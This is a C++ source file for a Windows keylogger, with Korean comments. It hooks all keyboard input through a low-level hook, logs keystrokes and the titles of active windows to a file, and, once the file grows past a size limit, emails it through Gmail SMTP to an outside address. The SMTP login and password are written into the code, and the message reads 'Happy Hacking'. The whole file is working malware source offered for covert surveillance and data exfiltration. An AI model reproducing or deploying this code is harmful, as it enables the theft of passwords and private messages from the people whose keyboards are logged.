// KeyLogger.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.

#define _CRT_SECURE_NO_WARNINGS
#define MAX_FILE_SIZE 20000
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;


FILE* f;
HHOOK hKeyboardHook;
static int keysPressed = 0;

void sendmail() {
	CkMailMan mailman;

	mailman.put_SmtpHost("smtp.gmail.com");
	mailman.put_SmtpUsername("didlaak6000@gmail.com");
	mailman.put_SmtpPassword("alvrbqh95");

	mailman.put_SmtpSsl(true);
	mailman.put_SmtpPort(465);

	CkEmail email;
	email.put_Subject("Hooked result has been successfully arrived!!");
	email.put_Body("Well Done! Happy Hacking :)");
	email.put_From("HackerX");

	bool success = email.AddTo(NULL, "didlaak6000@naver.com");

	const char* content = email.addFileAttachment(getlogfilepath(getlogfilename()));
	if (email.get_LastMethodSuccess() != true) {
		cout << email.lastErrorText() << "\r\n";
	}

	success = mailman.SendEmail(email);
	if (success != true) {
		std::cout << mailman.lastErrorText() << "\r\n";
				return;
	}

	success = mailman.CloseSmtpConnection();
	if (success != true) {
		cout << "Connection to SMTP server not closed cleanly." << "\r\n";
	}

	cout << "Mail with attachments sent!" << "\r\n";
}

DWORD WINAPI Keylogger(LPVOID lpParm) {
    HINSTANCE hins;
    hins = GetModuleHandle(NULL);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keystroke
	char* workFullPath;
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
		workFullPath = getlogfilepath(getlogfilename());
		if (workFullPath) {
			f = fopen(workFullPath, "a+");
		}
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		wchar_t lpszKeyName[1024] = { 0 };
		lpszKeyName[0] = '[';

		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
		int key = hooked_key.vkCode;
		lpszKeyName[i] = ']';
		if (key >= 'A' && key <= 'Z') {
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				key += 0x20;
			if (f != NULL)
				fprintf(f, "%c", key);
		}
		else {
			if (f != NULL)
				fprintf(f, "%s", ConvertWCtoC(lpszKeyName));
		}
		if ((keysPressed % 20) == 0) {
			fprintf(f, "\n");
		}
		keysPressed++;
		// hidefile(workFullPath);
		fclose(f);
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void wintitle() {		//  logging the currently running windows
    string oldtitle = gettitle();
	logger(string(gettitle()) + "\n");
    while (TRUE) {
        Sleep(100);
        if (gettitle() != oldtitle) {
            logger("\n" + string(gettitle()) + "\n");
        }
        oldtitle = gettitle();
    }
}

void FSD() {		// File size detetor
    while (TRUE) {
        Sleep(1000);
        if (getfilesize() > MAX_FILE_SIZE) {
            printf("File size over!\n");
			// sends logfile to email
			sendmail();
        }
    }
}